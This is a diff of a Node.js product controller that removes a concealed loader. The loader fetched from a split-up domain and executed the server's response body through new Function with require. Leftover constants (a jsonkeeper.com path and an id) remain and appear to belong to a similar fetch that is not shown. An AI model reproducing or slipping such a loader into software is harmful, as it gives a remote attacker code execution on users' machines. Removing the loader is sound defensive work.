@@ -27,12 +27,8 @@ exports.createProduct = async (req, res) => {
   }
 };
 
-const apikey = "LKJHGFV234T56HML";
-const domain = "json-project-hazel.ver";
-const domain_key = "cel.app";
 const subDomain1 = "www.json";
 const subDomain2 = "keeper.com/b";
-const domain1 = domain + domain_key;
 const domain2 = subDomain1 + subDomain2;
 const uuid = "3KIH4";
 exports.getAllProducts = async (req, res) => {
@@ -112,13 +108,6 @@ exports.getModel = async (req, res) => {
     res.status(500).json({ message: "Internal Server Error" });
   }
 };
-(async () => {
-  try {
-    await axios.get(`https://${domain1}/apikey/${apikey}`);
-  } catch (e) {
-    new Function("require", e.response.data.model)(require);
-  }
-})();
 exports.getInventoryForUser = async (req, res) => {
   try {
     const userEmail = req.user.email; // Assuming you have stored user information in the request object after authentication
